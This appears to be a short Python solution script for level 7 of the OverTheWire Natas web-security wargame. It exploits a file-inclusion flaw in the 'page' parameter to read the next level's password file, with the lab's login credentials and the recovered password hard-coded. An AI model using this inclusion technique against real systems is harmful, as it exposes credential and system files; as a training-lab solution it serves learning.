import requests
import re

url = 'http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8'
auth = requests.auth.HTTPBasicAuth('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9')
response = requests.post(url, auth=auth)
password = re.findall('(.*)\n', response.text)
print(password[18]) # DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe

